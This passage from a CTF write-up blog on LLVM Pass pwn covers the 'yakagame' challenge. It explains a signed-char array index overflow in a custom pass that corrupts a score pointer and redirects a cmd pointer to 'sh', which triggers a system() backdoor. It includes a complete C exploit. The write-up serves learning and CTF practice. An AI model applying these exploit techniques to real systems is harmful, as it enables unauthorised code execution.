  %94 = add nsw i64 %93, 4096
  %95 = add nsw i64 %94, 4096
  %96 = add nsw i64 %95, 4096
  %97 = add nsw i64 %96, 4096
  %98 = add nsw i64 %97, 4096
  %99 = add nsw i64 %98, 4096
  %100 = add nsw i64 %99, 4096
  %101 = add nsw i64 %100, 4096
  %102 = add nsw i64 %101, 4096
  %103 = add nsw i64 %102, 4096
  %104 = add nsw i64 %103, 4096
  %105 = add nsw i64 %104, 4096
  %106 = add nsw i64 %105, 4096
  %107 = add nsw i64 %106, 4096
  %108 = add nsw i64 %107, 4096
  %109 = add nsw i64 %108, 4096
  %110 = add nsw i64 %109, 4096
  %111 = add nsw i64 %110, 4096
  %112 = add nsw i64 %111, 4096
  %113 = add nsw i64 %112, 4096
  %114 = add nsw i64 %113, 4096
  %115 = add nsw i64 %114, 4096
  %116 = add nsw i64 %115, 4096
  %117 = add nsw i64 %116, 4096
  %118 = add nsw i64 %117, 4096
  %119 = add nsw i64 %118, 4096
  %120 = add nsw i64 %119, 4096
  %121 = add nsw i64 %120, 4096
  %122 = add nsw i64 %121, 4096
  %123 = add nsw i64 %122, 4096
  %124 = add nsw i64 %123, 4096
  %125 = add nsw i64 %124, 4096
  %126 = add nsw i64 %125, 4096
  %127 = add nsw i64 %126, 4096
  %128 = add nsw i64 %127, 4096
  %129 = add nsw i64 %128, 4096
  %130 = add nsw i64 %129, 4096
  %131 = add nsw i64 %130, 4096
  %132 = add nsw i64 %131, 4096
  %133 = add nsw i64 %132, 4096
  %134 = add nsw i64 %133, 4096
  %135 = add nsw i64 %134, 4096
  %136 = add nsw i64 %135, 4096
  %137 = add nsw i64 %136, 4096
  %138 = add nsw i64 %137, 4096
  %139 = add nsw i64 %138, 4096
  %140 = add nsw i64 %139, 4096
  %141 = add nsw i64 %140, 4096
  %142 = add nsw i64 %141, 4096
  %143 = add nsw i64 %142, 4096
  %144 = add nsw i64 %143, 4096
  %145 = add nsw i64 %144, 4096
  %146 = add nsw i64 %145, 4096
  %147 = add nsw i64 %146, 4096
  %148 = add nsw i64 %147, 4096
  %149 = add nsw i64 %148, 4096
  %150 = add nsw i64 %149, 4096
  %151 = add nsw i64 %150, 4096
  %152 = add nsw i64 %151, 4096
  %153 = add nsw i64 %152, 4096
  %154 = add nsw i64 %153, 4096
  %155 = add nsw i64 %154, 4096
  %156 = add nsw i64 %155, 4096
  %157 = add nsw i64 %156, 4096
  %158 = add nsw i64 %157, 4096
  %159 = add nsw i64 %158, 4096
  %160 = add nsw i64 %159, 4096
  %161 = add nsw i64 %160, 4096
  %162 = add nsw i64 %161, 4096
  %163 = add nsw i64 %162, 4096
  %164 = add nsw i64 %163, 4096
  %165 = add nsw i64 %164, 4096
  %166 = add nsw i64 %165, 4096
  %167 = add nsw i64 %166, 4096
  %168 = add nsw i64 %167, 4096
  %169 = add nsw i64 %168, 4096
  %170 = add nsw i64 %169, 4096
  %171 = add nsw i64 %170, 4096
  %172 = add nsw i64 %171, 4096
  %173 = add nsw i64 %172, 4096
  %174 = add nsw i64 %173, 4096
  %175 = add nsw i64 %174, 4096
  %176 = add nsw i64 %175, 4096
  %177 = add nsw i64 %176, 4096
  %178 = add nsw i64 %177, 4096
  %179 = add nsw i64 %178, 4096
  %180 = add nsw i64 %179, 4096
  %181 = add nsw i64 %180, 4096
  %182 = add nsw i64 %181, 4096
  %183 = add nsw i64 %182, 4096
  %184 = add nsw i64 %183, 4096
  %185 = add nsw i64 %184, 4096
  %186 = add nsw i64 %185, 4096
  %187 = add nsw i64 %186, 4096
  %188 = add nsw i64 %187, 4096
  %189 = add nsw i64 %188, 4096
  %190 = add nsw i64 %189, 4096
  %191 = add nsw i64 %190, 4096
  %192 = add nsw i64 %191, 4096
  %193 = add nsw i64 %192, 4096
  %194 = add nsw i64 %193, 4096
  %195 = add nsw i64 %194, 4096
  %196 = add nsw i64 %195, 4096
  %197 = add nsw i64 %196, 4096
  %198 = add nsw i64 %197, 4096
  %199 = add nsw i64 %198, 4096
  %200 = add nsw i64 %199, 4096
  %201 = add nsw i64 %200, 4096
  %202 = add nsw i64 %201, 4096
  %203 = add nsw i64 %202, 4096
  %204 = add nsw i64 %203, 4096
  %205 = add nsw i64 %204, 4096
  %206 = add nsw i64 %205, 4096
  %207 = add nsw i64 %206, 4096
  %208 = add nsw i64 %207, 4096
  %209 = add nsw i64 %208, 4096
  %210 = add nsw i64 %209, 4096
  %211 = add nsw i64 %210, 4096
  %212 = add nsw i64 %211, 4096
  %213 = add nsw i64 %212, 4096
  %214 = add nsw i64 %213, 4096
  %215 = add nsw i64 %214, 4096
  %216 = add nsw i64 %215, 4096
  %217 = add nsw i64 %216, 4096
  %218 = add nsw i64 %217, 4096
  %219 = add nsw i64 %218, 4096
  %220 = add nsw i64 %219, 4096
  %221 = add nsw i64 %220, 4096
  %222 = add nsw i64 %221, 4096
  %223 = add nsw i64 %222, 4096
  %224 = add nsw i64 %223, 4096
  %225 = add nsw i64 %224, 4096
  %226 = add nsw i64 %225, 4096
  %227 = add nsw i64 %226, 4096
  %228 = add nsw i64 %227, 4096
  %229 = add nsw i64 %228, 4096
  %230 = add nsw i64 %229, 4096
  %231 = add nsw i64 %230, 4096
  %232 = add nsw i64 %231, 4096
  %233 = add nsw i64 %232, 4096
  %234 = add nsw i64 %233, 4096
  %235 = add nsw i64 %234, 4096
  %236 = add nsw i64 %235, 4096
  %237 = add nsw i64 %236, 4096
  %238 = add nsw i64 %237, 4096
  %239 = add nsw i64 %238, 4096
  %240 = add nsw i64 %239, 4096
  %241 = add nsw i64 %240, 4096
  %242 = add nsw i64 %241, 4096
  %243 = add nsw i64 %242, 4096
  %244 = add nsw i64 %243, 4096
  %245 = add nsw i64 %244, 4096
  %246 = add nsw i64 %245, 4096
  %247 = add nsw i64 %246, 4096
  %248 = add nsw i64 %247, 4096
  %249 = add nsw i64 %248, 4096
  %250 = add nsw i64 %249, 4096
  %251 = add nsw i64 %250, 4096
  %252 = add nsw i64 %251, 4096
  %253 = add nsw i64 %252, 4096
  %254 = add nsw i64 %253, 4096
  %255 = add nsw i64 %254, 4096
  %256 = add nsw i64 %255, 4096
  %257 = add nsw i64 %256, 4096
  %258 = add nsw i64 %257, 4096
  %259 = add nsw i64 %258, 4096
  %260 = add nsw i64 %259, 4096
  %261 = add nsw i64 %260, 4096
  %262 = add nsw i64 %261, 4096
  %263 = add nsw i64 %262, 4096
  %264 = add nsw i64 %263, 4096
  %265 = add nsw i64 %264, 4096
  %266 = add nsw i64 %265, 4096
  %267 = add nsw i64 %266, 4096
  %268 = add nsw i64 %267, 4096
  %269 = add nsw i64 %268, 4096
  %270 = add nsw i64 %269, 4096
  %271 = add nsw i64 %270, 4096
  %272 = add nsw i64 %271, 4096
  %273 = add nsw i64 %272, 4096
  %274 = add nsw i64 %273, 4096
  %275 = add nsw i64 %274, 4096
  %276 = add nsw i64 %275, 4096
  %277 = add nsw i64 %276, 4096
  %278 = add nsw i64 %277, 4096
  %279 = add nsw i64 %278, 4096
  %280 = add nsw i64 %279, 4096
  %281 = add nsw i64 %280, 4096
  %282 = add nsw i64 %281, 4096
  %283 = add nsw i64 %282, 4096
  %284 = add nsw i64 %283, 4096
  %285 = add nsw i64 %284, 4096
  %286 = add nsw i64 %285, 4096
  %287 = add nsw i64 %286, 4096
  %288 = add nsw i64 %287, 4096
  %289 = add nsw i64 %288, 4096
  %290 = add nsw i64 %289, 4096
  %291 = add nsw i64 %290, 4096
  %292 = add nsw i64 %291, 4096
  %293 = add nsw i64 %292, 4096
  %294 = add nsw i64 %293, 4096
  %295 = add nsw i64 %294, 4096
  %296 = add nsw i64 %295, 4096
  %297 = add nsw i64 %296, 4096
  %298 = add nsw i64 %297, 4096
  %299 = add nsw i64 %298, 4096
  %300 = add nsw i64 %299, 4096
  %301 = add nsw i64 %300, 4096
  %302 = add nsw i64 %301, 4096
  %303 = add nsw i64 %302, 4096
  %304 = add nsw i64 %303, 4096
  %305 = add nsw i64 %304, 4096
  %306 = add nsw i64 %305, 4096
  %307 = add nsw i64 %306, 4096
  %308 = add nsw i64 %307, 4096
  %309 = add nsw i64 %308, 4096
  %310 = add nsw i64 %309, 4096
  %311 = add nsw i64 %310, 4096
  %312 = add nsw i64 %311, 1
  %313 = add nsw i64 %312, 1
  %314 = add nsw i64 %313, 1
  %315 = add nsw i64 %314, 1
  %316 = add nsw i64 %315, 1
  %317 = add nsw i64 %316, 1
  %318 = add nsw i64 %317, 1
  %319 = add nsw i64 %318, 1
  %320 = add nsw i64 %319, 1
  ret i64 %320
}


attributes #0 = { noinline nounwind optnone uwtable "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"}

```



## yakagame

本题重写的`runOnFunction`函数为`sub_C880`，`PASS`名称为`ayaka`。

![image-20240108205257197](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352530.png)

主要是对gamestart 函数进行操作

![image-20240108205419289](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352531.png)

gamestart 中调用fight时，当sorce>0x12345678 ，会调用后门函数

![image-20240108210029366](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352532.png)

只要设定cmd 指针指向的字符串，就可以获得shell 了
![Pasted image 20240108212545](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352533.png)
简单介绍一下各个函数的含义：

- fight：传入的参数为weapon_list的索引，取出weapon_list[index]的值和boss比较，如果大于等于boss则判定为赢，并赋值给相应的分数；否则判定为输，对分数没有影响。如果分数大于0x12345678就会执行后门函数。后门函数执行system(cmd)，
- merge：传入的参数为为两个weapon_list的index，index1，index2，weapon_list[index1]+=weapon_list[index2]
- destroy: 传入的参数为weapon_list的索引，waepon_list[index]=0
- upgrade: 传入一个整数，所有的weapon 加上该整数
- wuxiangdeyidao，zhanjinniuza，guobapenhuo，tiandongwanxiang：对cmd 进行不同的处理（异或，加，减），应该可以恢复出 cat flag。
- 其它名称的函数：
  	这里用了`C++ STL`里的`map`，`map`可在任意类型的值之间建立映射关系：`map[key]=value`，并且会按关键字从小到大排序。如：`map["abc"] = 123`就将`abc`这个字符串与`123`这个数值间建立了映射关系，并且在通过迭代器遍历`map`的时候，关键字`abc`会在关键字`abd`之前遍历到。
  	在这个`else`分支中，会先遍历`map`，查找是否有调用的这个函数名作为`key`，其第一个参数作为`value`的映射关系。若是有，则会将`weaponlist[]`数组下标对应`map`中此映射关系位置的值改为这个`value`。若没有，则会将这个新映射关系加入`map`中。
  	![Pasted image 20240108215012](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352534.png)
  	`v33`是有符号的`char`类型，其范围是`-128~127`，故当`map`中映射关系很多的时候，`v33`会是负数，此处也就存在一个数组下标越界的漏洞了。
  	![Pasted image 20240108215935](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352535.png)如上图，可以看到`cmd`指针和`score`指针都在`weaponlist`之前，故可以通过这个数组下标越界漏洞，修改`score`指针的最后一字节，使其错位，从而指向很大的数字，触发后门函数。
  	由于`opt`没开`PIE`保护，故直接将`cmd`指针指向`opt`中的某个字符串末尾的`sh`即可：
  	![Pasted image 20240108221316](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352536.png)
  ![Pasted image 20240108222533](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352537.png)
  经过溢出篡改后
  ![Pasted image 20240108222337](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501042352538.png)

### exp

```C
//sh_addr 0x412229
void chuwei000(int num);
void chuwei001(int num);
void chuwei002(int num);
void chuwei003(int num);
void chuwei004(int num);
void chuwei005(int num);
void chuwei006(int num);
void chuwei007(int num);
void chuwei008(int num);
void chuwei009(int num);
void chuwei010(int num);
void chuwei011(int num);
void chuwei012(int num);
void chuwei013(int num);
void chuwei014(int num);
void chuwei015(int num);
void chuwei016(int num);
void chuwei017(int num);
void chuwei018(int num);
void chuwei019(int num);
void chuwei020(int num);
void chuwei021(int num);
void chuwei022(int num);
void chuwei023(int num);
void chuwei024(int num);
void chuwei025(int num);
void chuwei026(int num);
void chuwei027(int num);
void chuwei028(int num);
void chuwei029(int num);
void chuwei030(int num);
void chuwei031(int num);
void chuwei032(int num);
void chuwei033(int num);
void chuwei034(int num);
void chuwei035(int num);
void chuwei036(int num);
void chuwei037(int num);
void chuwei038(int num);
void chuwei039(int num);
void chuwei040(int num);
void chuwei041(int num);
void chuwei042(int num);
void chuwei043(int num);
void chuwei044(int num);
void chuwei045(int num);
void chuwei046(int num);
void chuwei047(int num);
void chuwei048(int num);
void chuwei049(int num);
void chuwei050(int num);
void chuwei051(int num);
void chuwei052(int num);
void chuwei053(int num);
void chuwei054(int num);
void chuwei055(int num);
void chuwei056(int num);
void chuwei057(int num);
void chuwei058(int num);
void chuwei059(int num);
void chuwei060(int num);
void chuwei061(int num);
void chuwei062(int num);
void chuwei063(int num);
void chuwei064(int num);
void chuwei065(int num);
void chuwei066(int num);
void chuwei067(int num);
void chuwei068(int num);
void chuwei069(int num);
void chuwei070(int num);
void chuwei071(int num);
void chuwei072(int num);
void chuwei073(int num);
void chuwei074(int num);
void chuwei075(int num);
void chuwei076(int num);
void chuwei077(int num);
void chuwei078(int num);
void chuwei079(int num);
void chuwei080(int num);
void chuwei081(int num);
void chuwei082(int num);
void chuwei083(int num);
void chuwei084(int num);
void chuwei085(int num);
void chuwei086(int num);
void chuwei087(int num);
void chuwei088(int num);
void chuwei089(int num);
void chuwei090(int num);
void chuwei091(int num);
void chuwei092(int num);
void chuwei093(int num);
void chuwei094(int num);
void chuwei095(int num);
void chuwei096(int num);
void chuwei097(int num);
void chuwei098(int num);
void chuwei099(int num);
void chuwei100(int num);
void chuwei101(int num);
void chuwei102(int num);
void chuwei103(int num);
void chuwei104(int num);
void chuwei105(int num);
void chuwei106(int num);
void chuwei107(int num);
void chuwei108(int num);
void chuwei109(int num);
void chuwei110(int num);
void chuwei111(int num);
void chuwei112(int num);
void chuwei113(int num);
void chuwei114(int num);
void chuwei115(int num);
void chuwei116(int num);
void chuwei117(int num);
void chuwei118(int num);
void chuwei119(int num);
void chuwei120(int num);
void chuwei121(int num);
void chuwei122(int num);
void chuwei123(int num);
void chuwei124(int num);
void chuwei125(int num);
void chuwei126(int num);
void chuwei127(int num);
void chuwei128(int num);
void chuwei129(int num);
void chuwei130(int num);
void chuwei131(int num);
void chuwei132(int num);
void chuwei133(int num);
void chuwei134(int num);
void chuwei135(int num);
void chuwei136(int num);
void chuwei137(int num);
void chuwei138(int num);
void chuwei139(int num);
void chuwei140(int num);
void chuwei141(int num);
void chuwei142(int num);
void chuwei143(int num);
void chuwei144(int num);
void chuwei145(int num);
void chuwei146(int num);
void chuwei147(int num);
void chuwei148(int num);
void chuwei149(int num);
void chuwei150(int num);
void chuwei151(int num);
void chuwei152(int num);
void chuwei153(int num);
void chuwei154(int num);
void chuwei155(int num);
void chuwei156(int num);
void chuwei157(int num);
void chuwei158(int num);
void chuwei159(int num);
void chuwei160(int num);
void chuwei161(int num);
void chuwei162(int num);
void chuwei163(int num);
void chuwei164(int num);
void chuwei165(int num);
void chuwei166(int num);
void chuwei167(int num);
void chuwei168(int num);
void chuwei169(int num);
void chuwei170(int num);
void chuwei171(int num);
void chuwei172(int num);
void chuwei173(int num);
void chuwei174(int num);
void chuwei175(int num);
void chuwei176(int num);
void chuwei177(int num);
void chuwei178(int num);
void chuwei179(int num);
void chuwei180(int num);
void chuwei181(int num);
void chuwei182(int num);
void chuwei183(int num);
void chuwei184(int num);
void chuwei185(int num);
void chuwei186(int num);
void chuwei187(int num);
void chuwei188(int num);
void chuwei189(int num);
void chuwei190(int num);
void chuwei191(int num);
void chuwei192(int num);
void chuwei193(int num);
void chuwei194(int num);
void chuwei195(int num);
void chuwei196(int num);
void chuwei197(int num);
void chuwei198(int num);
void chuwei199(int num);
void chuwei200(int num);
void chuwei201(int num);
void chuwei202(int num);
void chuwei203(int num);
void chuwei204(int num);
void chuwei205(int num);
void chuwei206(int num);
void chuwei207(int num);
void chuwei208(int num);
void chuwei209(int num);
void chuwei210(int num);
void chuwei211(int num);
void chuwei212(int num);
void chuwei213(int num);
void chuwei214(int num);
void chuwei215(int num);
void chuwei216(int num);
void chuwei217(int num);
void chuwei218(int num);
void chuwei219(int num);
void chuwei220(int num);
void chuwei221(int num);
void chuwei222(int num);
void chuwei223(int num);
void chuwei224(int num);
void chuwei225(int num);
void chuwei226(int num);
void chuwei227(int num);
void chuwei228(int num);
void chuwei229(int num);
void chuwei230(int num);
void chuwei231(int num);
void chuwei232(int num);
void chuwei233(int num);
void chuwei234(int num);
void chuwei235(int num);
void chuwei236(int num);
void chuwei237(int num);
void chuwei238(int num);
void chuwei239(int num);
void chuwei240(int num);
void chuwei241(int num);
void chuwei242(int num);
void chuwei243(int num);
void chuwei244(int num);
void chuwei245(int num);
void chuwei246(int num);
void chuwei247(int num);
void chuwei248(int num);
void chuwei249(int num);
void chuwei250(int num);
void chuwei251(int num);
void chuwei252(int num);
void chuwei253(int num);
void chuwei254(int num);

void fight(int num);
void gamestart(){
	chuwei000(0);
	chuwei001(0);
	chuwei002(0);
	chuwei003(0);
	chuwei004(0);
	chuwei005(0);
	chuwei006(0);
	chuwei007(0);
	chuwei008(0);
	chuwei009(0);
	chuwei010(0);
	chuwei011(0);
	chuwei012(0);
	chuwei013(0);
	chuwei014(0);
	chuwei015(0);
	chuwei016(0);
	chuwei017(0);
	chuwei018(0);
	chuwei019(0);
	chuwei020(0);
	chuwei021(0);
	chuwei022(0);
	chuwei023(0);
	chuwei024(0);
	chuwei025(0);
	chuwei026(0);
	chuwei027(0);
	chuwei028(0);
	chuwei029(0);
	chuwei030(0);
	chuwei031(0);
	chuwei032(0);
	chuwei033(0);
	chuwei034(0);
	chuwei035(0);
	chuwei036(0);
	chuwei037(0);
	chuwei038(0);
	chuwei039(0);
	chuwei040(0);
	chuwei041(0);
	chuwei042(0);
	chuwei043(0);
	chuwei044(0);
	chuwei045(0);
	chuwei046(0);
	chuwei047(0);
	chuwei048(0);
	chuwei049(0);
	chuwei050(0);
	chuwei051(0);
	chuwei052(0);
	chuwei053(0);
	chuwei054(0);
	chuwei055(0);
	chuwei056(0);
	chuwei057(0);
	chuwei058(0);
	chuwei059(0);
	chuwei060(0);
	chuwei061(0);
	chuwei062(0);
	chuwei063(0);
	chuwei064(0);
	chuwei065(0);
	chuwei066(0);
	chuwei067(0);
	chuwei068(0);
	chuwei069(0);
	chuwei070(0);
	chuwei071(0);
	chuwei072(0);
	chuwei073(0);
	chuwei074(0);
	chuwei075(0);
	chuwei076(0);
	chuwei077(0);
	chuwei078(0);
	chuwei079(0);
	chuwei080(0);
	chuwei081(0);
	chuwei082(0);
	chuwei083(0);
	chuwei084(0);
	chuwei085(0);
	chuwei086(0);
	chuwei087(0);
	chuwei088(0);
	chuwei089(0);
	chuwei090(0);
	chuwei091(0);
	chuwei092(0);
	chuwei093(0);
	chuwei094(0);
	chuwei095(0);
	chuwei096(0);
	chuwei097(0);
	chuwei098(0);
	chuwei099(0);
	chuwei100(0);
	chuwei101(0);
	chuwei102(0);
	chuwei103(0);
	chuwei104(0);
	chuwei105(0);
	chuwei106(0);
	chuwei107(0);
	chuwei108(0);
	chuwei109(0);
	chuwei110(0);
	chuwei111(0);
	chuwei112(0);
	chuwei113(0);
	chuwei114(0);
	chuwei115(0);
	chuwei116(0);
	chuwei117(0);
	chuwei118(0);
	chuwei119(0);
	chuwei120(0);
	chuwei121(0);
	chuwei122(0);
	chuwei123(0);
	chuwei124(0);
	chuwei125(0);
	chuwei126(0);
	chuwei127(0);
	chuwei128(0);
	chuwei129(0);
	chuwei130(0);
	chuwei131(0);
	chuwei132(0);
	chuwei133(0);
	chuwei134(0);
	chuwei135(0);
	chuwei136(0);
	chuwei137(0);
	chuwei138(0);
	chuwei139(0);
	chuwei140(0);
	chuwei141(0);
	chuwei142(0);
	chuwei143(0);
	chuwei144(0);
	chuwei145(0);
	chuwei146(0);
	chuwei147(0);
	chuwei148(0);
	chuwei149(0);
	chuwei150(0);
	chuwei151(0);
	chuwei152(0);
	chuwei153(0);
	chuwei154(0);
	chuwei155(0);
	chuwei156(0);
	chuwei157(0);
	chuwei158(0);
	chuwei159(0);
	chuwei160(0);
	chuwei161(0);
	chuwei162(0);
	chuwei163(0);
	chuwei164(0);
	chuwei165(0);
	chuwei166(0);
	chuwei167(0);
	chuwei168(0);
	chuwei169(0);
	chuwei170(0);
	chuwei171(0);
	chuwei172(0);
	chuwei173(0);
	chuwei174(0);
	chuwei175(0);
	chuwei176(0);
	chuwei177(0);
	chuwei178(0);
	chuwei179(0);
	chuwei180(0);
	chuwei181(0);
	chuwei182(0);
	chuwei183(0);
	chuwei184(0);
	chuwei185(0);
	chuwei186(0);
	chuwei187(0);
	chuwei188(0);
	chuwei189(0);
	chuwei190(0);
	chuwei191(0);
	chuwei192(0);
	chuwei193(0);
	chuwei194(0);
	chuwei195(0);
	chuwei196(0);
	chuwei197(0);
	chuwei198(0);
	chuwei199(0);
	chuwei200(0);
	chuwei201(0);
	chuwei202(0);
	chuwei203(0);
	chuwei204(0);
	chuwei205(0);
	chuwei206(0);
	chuwei207(0);
	chuwei208(0);
	chuwei209(0);
	chuwei210(0);
	chuwei211(0);
	chuwei212(0);
	chuwei213(0);
	chuwei214(0);
	chuwei215(0);
	chuwei216(0);
	chuwei217(0);
	chuwei218(0);
	chuwei219(0);
	chuwei220(0);
	chuwei221(0);
	chuwei222(0);
	chuwei223(0);
	chuwei224(0);
	chuwei225(0);
	chuwei226(0);
	chuwei227(0);
	chuwei228(0);
	chuwei229(0);
	chuwei230(0);
	chuwei231(0);
	chuwei232(0x29);
	chuwei233(0x22);
	chuwei234(0x41);
	chuwei235(0x00);
	chuwei236(0);
	chuwei237(0);
	chuwei238(0);
	chuwei239(0);
	chuwei240(0xb0);//f0
	chuwei241(0);//f1
	chuwei242(0);//f2
	chuwei243(0);//f3
	chuwei244(0);//f4
	chuwei245(0);//f5
	chuwei246(0);//f6
	chuwei247(0);//f7
	chuwei248(0);//f8
	chuwei249(0);//f9
	chuwei250(0);//fa
	chuwei251(0);//fb
	chuwei252(0);//fc
	chuwei253(0);//fd
	chuwei254(0);//fe


	chuwei232(0);
	chuwei233(0);
	chuwei234(0);
	chuwei235(0);
	chuwei240(0);
	fight(0);
}
```

## 参考链接

https://bbs.kanxue.com/thread-274259.htm
https://blog.csdn.net/qq_54218833?type=blog
https://blog.csdn.net/weixin_46483787/article/details/125177862

---

> 作者: chuwei  
> URL: https://chuw3i.github.io/posts/llvm-pass-pwn-%E5%AD%A6%E4%B9%A0/  

